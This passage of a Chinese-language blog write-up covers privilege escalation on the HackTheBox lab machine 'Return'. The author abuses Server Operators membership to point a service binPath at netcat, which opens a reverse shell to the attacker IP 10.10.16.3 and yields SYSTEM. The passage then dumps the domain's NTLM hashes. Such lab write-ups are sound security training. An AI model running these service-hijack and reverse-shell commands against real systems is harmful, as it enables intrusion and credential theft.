+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net localgroup <span class="hljs-string">&quot;Server Operators&quot;</span><br>Alias name     Server Operators<br>Comment        Members can administer domain servers<br><br>Members<br><br>-------------------------------------------------------------------------------<br>svc-printer<br>The <span class="hljs-built_in">command</span> completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net localgroup <span class="hljs-string">&quot;Print Operators&quot;</span><br>Alias name     Print Operators<br>Comment        Members can administer printers installed on domain controllers<br><br>Members<br><br>-------------------------------------------------------------------------------<br>svc-printer<br>The <span class="hljs-built_in">command</span> completed successfully.<br></code></pre></td></tr></table></figure>
+<p>PRINT那个组可以理解，看一下server那个组有么有利用的方式<br><a data-fancybox="gallery" data-src="/images/return-4.png" data-caption=""><img src="/images/return-4.png"></a><br>找到一篇详细的<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">利用文章</a><br>跟着他给的利用一下<br><strong>具体滥用细节可以看一下文章</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; services<br><br>Path                                                                                                                 Privileges Service          <br>----                                                                                                                 ---------- -------          <br>C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             <br>\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\&#123;5533AFC7-64B3-4F6E-B453-E35320B35716&#125;\MpKslDrv.sys       True MpKslceeb2796    <br>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing<br>C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         <br><span class="hljs-string">&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;</span>                                                False Sense            <br>C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller <br><span class="hljs-string">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span>                                                     True VGAuthService    <br><span class="hljs-string">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span>                                                                        True VMTools          <br><span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;</span>                                             True WdNisSvc         <br><span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;</span>                                            True WinDefend        <br><span class="hljs-string">&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;</span>                                                                      False WMPNetworkSvc    <br><span class="hljs-comment">#挑选vss作为狩猎对象</span><br><br>*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; wget http://10.10.16.3:9090/nc.exe -O nc.exe<br><span class="hljs-comment">#上传nc</span><br><br>*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe config VMTools binPath=<span class="hljs-string">&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 9002&quot;</span><br>[SC] ChangeServiceConfig SUCCESS<br><span class="hljs-comment">#进行滥用，reverse shell插入</span><br><br>*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe stop VMTools<br><br>SERVICE_NAME: VMTools<br>        TYPE               : 10  WIN32_OWN_PROCESS<br>        STATE              : 1  STOPPED<br>        WIN32_EXIT_CODE    : 0  (0x0)<br>        SERVICE_EXIT_CODE  : 0  (0x0)<br>        CHECKPOINT         : 0x0<br>        WAIT_HINT          : 0x0<br>*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe start VMTools<br><span class="hljs-comment">#启动shell</span><br><br>$ rlwrap -cAr nc -lvnp 9002<br>Listening on 0.0.0.0 9002<br>Connection received on 10.129.49.187 59320<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;C:\Users\svc-printer\desktop\rev.exe<br><br>C:\Users\svc-printer\desktop\rev.exe<br><br>C:\Windows\system32&gt;<br>C:\Windows\system32&gt;<br><span class="hljs-comment">#由于反弹shell存活时间短，直接快速把之前上传的msf再启动一下</span><br><br>meterpreter &gt; shell<br>Process 4688 created.<br>Channel 1 created.<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e48ce125611add31a32cd79e529964b:::<br>svc-printer:1103:aad3b435b51404eeaad3b435b51404ee:c1d26bdcecf44246b5f8653284331a2e:::<br>PRINTER$:1000:aad3b435b51404eeaad3b435b51404ee:0db6da84f360fe606a4eb8ac97165bad:::<br></code></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/random/">random_thoughts</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-ldap"><span class="toc-number">1.1.</span> <span class="toc-text">smb&#x2F;ldap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printer-return-local"><span class="toc-number">1.2.</span> <span class="toc-text">printer.return.local</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-svc-printer"><span class="toc-number">2.</span> <span class="toc-text">shell as svc-printer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">3.</span> <span class="toc-text">Hashes</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&text=HackTheBox——Tracks AD Return"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&is_video=false&description=HackTheBox——Tracks AD Return"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Return&body=Check out this article: https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&name=HackTheBox——Tracks AD Return&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&t=HackTheBox——Tracks AD Return"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random_thoughts</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+</body>
+</html>
